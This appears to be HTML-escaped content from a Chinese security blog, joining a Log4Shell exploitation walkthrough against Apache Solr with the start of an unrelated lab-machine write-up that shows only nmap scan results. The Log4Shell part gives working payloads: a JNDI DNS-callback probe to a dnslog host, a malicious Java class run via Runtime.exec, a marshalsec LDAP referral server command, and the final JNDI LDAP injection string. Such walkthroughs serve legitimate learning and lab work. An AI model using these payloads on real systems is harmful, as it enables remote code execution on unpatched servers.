&lt;h4 id=&#34;利用链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用链&#34;&gt;#&lt;/a&gt; 利用链&lt;/h4&gt;
&lt;h5 id=&#34;dnslog验证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dnslog验证&#34;&gt;#&lt;/a&gt; dnslog 验证&lt;/h5&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/solr/admin/cores?action&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$&amp;#123;jndi&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;dns&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;$&amp;#123;sys&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;java.version&amp;#125;&lt;/span&gt;.45046de8.log.dnslog.biz.&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240811230754.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
 很明显利用成功。&lt;br /&gt;
既然证明存在现在我们的想法肯定是想利用 ldap 服务器进行一个 rce，因为 jndi 查询服务不仅可以查询 dns 服务还可以查询 ldap 服务。ldap 又可以访问我们的 web 服务。从而让服务器下载对应的恶意 web&lt;br /&gt;
java class 文件从而执行&lt;/p&gt;
&lt;h5 id=&#34;rce&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; rce&lt;/h5&gt;
&lt;h6 id=&#34;准备恶意文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#准备恶意文件&#34;&gt;#&lt;/a&gt; 准备恶意文件&lt;/h6&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;package&lt;/span&gt; &lt;span class=&#34;token namespace&#34;&gt;org&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;IOException&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; log4j &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; args&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        log4j exploit &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt;  &lt;span class=&#34;token function&#34;&gt;log4j&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;log4j&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;calc&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;IOException&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt; &lt;code&gt;Runtime.getRuntime().exec(&amp;quot;calc&amp;quot;);&lt;/code&gt; &lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Runtime.getRuntime()&lt;/code&gt;  返回当前应用程序的运行时对象，该对象允许应用程序与运行环境进行交互。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exec(&amp;quot;calc&amp;quot;)&lt;/code&gt;  方法用于执行指定的系统命令。在 Windows 操作系统上， &lt;code&gt;&amp;quot;calc&amp;quot;&lt;/code&gt;  是启动计算器的命令。因此，这行代码试图启动计算器应用程序。&lt;/li&gt;
&lt;li&gt;如果你在其他操作系统上运行这个代码（比如 macOS 或 Linux）， &lt;code&gt;&amp;quot;calc&amp;quot;&lt;/code&gt;  可能不会有任何效果，因为计算器的命令在不同操作系统上是不同的。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt; &lt;code&gt;catch (IOException e)&lt;/code&gt; &lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;IOException&lt;/code&gt;  是一个异常，表示在输入或输出操作中发生了问题。在这里，它用于捕获  &lt;code&gt;exec&lt;/code&gt;  方法可能抛出的异常（例如命令无法执行或文件无法找到）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;e.printStackTrace();&lt;/code&gt;  用于打印异常的堆栈跟踪，以帮助调试和找出错误的具体&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240811232320.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240814224511.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
 先开启一个 web 服务 ，之后利用工具创建 ldap 服务器之后开始攻击。&lt;/p&gt;
&lt;h5 id=&#34;准备ldap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#准备ldap&#34;&gt;#&lt;/a&gt; 准备 ldap&lt;/h5&gt;
&lt;p&gt;我们需要使用 jndi 找到 ldap 服务，之后使用 ldap 的功能去访问我们的 web 服务器。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;完事具备就差 ldap 服务器&lt;/th&gt;
&lt;th&gt;&lt;a href=&#34;marshalsec.md#**%E5%BC%80%E5%90%AFLDAP%E6%9C%8D%E5%8A%A1&#34;&gt;** 开启 LDAP 服务&lt;/a&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;/table&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;java&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-cp&lt;/span&gt; target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:1234/&lt;span class=&#34;token comment&#34;&gt;#log4j 1389&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这个可以直接确定 ldap 端口和 ldap 响应的 url&lt;br /&gt;
&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240814225636.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
 我们必须在 class 文件中省略 class 后缀只能用 #名字&lt;br /&gt;
 Listening on 0.0.0.0:1389&lt;br /&gt;
 已经启动此时我们需要直接触发链条&lt;/p&gt;
&lt;h4 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; ***payload&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/solr/admin/cores?action&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$&amp;#123;jndi&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;ldap&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;127.0.0.1&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;1389&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

 &lt;h2 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h2&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PORT   STATE SERVICE&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;22&lt;/span&gt;/tcp &lt;span class=&#34;token function&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;/tcp &lt;span class=&#34;token function&#34;&gt;open&lt;/span&gt;  http&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;MAC Address: 08:00:27:2A:FE:97 &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;全端口扫描也只扫描了一个 22 和一个 80, 开始识别一些服务&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PORT   STATE SERVICE VERSION&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;22&lt;/span&gt;/tcp &lt;span class=&#34;token function&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt;     OpenSSH &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;.9p1 Ubuntu 3ubuntu0.5 &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; protocol &lt;span class=&#34;token number&#34;&gt;2.0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; ssh-hostkey: &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt; 81a4522b143f13682be25bc47bd71aa5 &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt; 251909292fb8eab4291f6de713d6be7e &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;/tcp &lt;span class=&#34;token function&#34;&gt;open&lt;/span&gt;  http    Apache httpd &lt;span class=&#34;token number&#34;&gt;2.4&lt;/span&gt;.52 &lt;span class=&#34;token variable&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;token punctuation&#34;&gt;))&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;_http-title: Under Construction - Midnight Coffee&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.52 &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;MAC Address: 08:00:27:2A:FE:97 &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Device type: general purpose&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Running: Linux &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;.X&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;.X&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;OS details: Linux &lt;span class=&#34;token number&#34;&gt;4.15&lt;/span&gt; - &lt;span class=&#34;token number&#34;&gt;5.6&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Network Distance: &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; hop&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Service Info: OS: Linux&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;资产梳理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#资产梳理&#34;&gt;#&lt;/a&gt; 资产梳理&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ssh&lt;/th&gt;
&lt;th&gt;OpenSSH 8.9p1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;服务器&lt;/td&gt;
&lt;td&gt;Apache httpd 2.4.52 ((Ubuntu))&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;(Ubuntu))&lt;/td&gt;
&lt;/tr&gt;
